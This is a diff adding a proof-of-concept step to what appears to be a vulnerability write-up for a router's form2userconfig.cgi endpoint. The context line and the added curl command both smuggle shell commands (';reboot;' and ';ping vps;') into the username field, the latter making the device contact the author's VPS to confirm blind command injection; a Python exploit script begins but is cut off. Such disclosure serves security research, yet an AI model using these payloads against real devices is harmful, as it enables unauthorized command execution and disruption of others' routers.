@@ -50,6 +50,12 @@ username=123';reboot;'&oldpass=123&newpass=123&confpass=123&deluser=Delete&selec
 
 ##### POC&&EXP
 
+input vps ip
+```
+curl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=Admin';ping vps;'&oldpass=123&newpass=123&confpass=123&deluser=Delete&select=s0&hiddenpass=&submit.htm%3Fuserconfig.htm=Send"
+```
+ Now it will ping my VPS address 
+
 ```python
 import requests
 import base64
